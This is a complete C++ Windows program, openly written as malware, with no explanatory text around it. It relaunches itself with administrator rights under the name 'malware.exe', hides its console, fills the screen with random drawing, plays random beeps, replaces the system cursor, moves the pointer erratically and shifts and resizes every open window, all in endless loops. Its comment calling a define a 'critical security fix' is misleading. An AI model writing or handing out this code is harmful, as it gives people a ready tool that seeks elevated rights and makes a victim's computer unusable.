#define SECURITY_WIN32  // Critical security fix  
#define OEMRESOURCE  
#include <Windows.h>    // MUST be first  
#include <shellapi.h>  
#include <security.h>  
#include <chrono>  
#include <thread>  
#include <cstdlib>  
#include <cmath>  
#include <Mmsystem.h>  
#pragma comment(lib, "winmm.lib")  

using namespace std;  

bool isAdmin() {  
    BOOL isAdmin = FALSE;  
    SID_IDENTIFIER_AUTHORITY NtAuthority = SECURITY_NT_AUTHORITY;  
    PSID AdminGroup;  
    if (AllocateAndInitializeSid(&NtAuthority, 2, SECURITY_BUILTIN_DOMAIN_RID, DOMAIN_ALIAS_RID_ADMINS, 0, 0, 0, 0, 0, 0, &AdminGroup)) {  
        CheckTokenMembership(NULL, AdminGroup, &isAdmin);  
        FreeSid(AdminGroup);  
    }  
    return isAdmin;  
}  

void relaunchAsAdmin() {  
    ShellExecuteW(NULL, L"runas", L"malware.exe", NULL, NULL, SW_HIDE);  
    exit(0);  
}  

void drawChaos() {  
    HDC hdc = GetDC(NULL);  
    int w = GetSystemMetrics(SM_CXSCREEN);  
    int h = GetSystemMetrics(SM_CYSCREEN);  
    while (true) {  
        int x1 = rand() % w, y1 = rand() % h;  
        int x2 = rand() % w, y2 = rand() % h;  
        HPEN pen = CreatePen(PS_SOLID, 2, RGB(rand() % 255, rand() % 255, rand() % 255));  
        SelectObject(hdc, pen);  
        MoveToEx(hdc, x1, y1, NULL);  
        LineTo(hdc, x2, y2);  
        DeleteObject(pen);  
        Sleep(10);  
    }  
    ReleaseDC(NULL, hdc);  
}  

void soundChaos() {  
    while (true) {  
        Beep(rand() % 2000 + 500, rand() % 500);  
        Sleep(rand() % 1000);  
    }  
}  

void corruptGUI() {  
    HCURSOR hCur = LoadCursor(NULL, IDC_WAIT);  
    SetSystemCursor(hCur, OCR_NORMAL);  

    thread([]() {  
        while (true) {  
            SetCursorPos(rand() % GetSystemMetrics(SM_CXSCREEN), rand() % GetSystemMetrics(SM_CYSCREEN));  
            Sleep(50);  
        }  
    }).detach();  

    EnumWindows([](HWND hwnd, LPARAM lParam) -> BOOL {  
        RECT rect;  
        GetWindowRect(hwnd, &rect);  
        SetWindowPos(hwnd, NULL,  
            rect.left + (rand() % 100 - 50),  
            rect.top + (rand() % 100 - 50),  
            rect.right - rect.left + (rand() % 200 - 100),  
            rect.bottom - rect.top + (rand() % 200 - 100),  
            SWP_NOZORDER);  
        return TRUE;  
    }, 0);  
}  

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {  
    FreeConsole();  
    if (!isAdmin()) relaunchAsAdmin();  
    srand(GetTickCount());  

    thread drawThread(drawChaos);  
    thread soundThread(soundChaos);  

    this_thread::sleep_for(chrono::seconds(40));  
    corruptGUI();  

    drawThread.join();  
    soundThread.join();  
    return 0;  
}  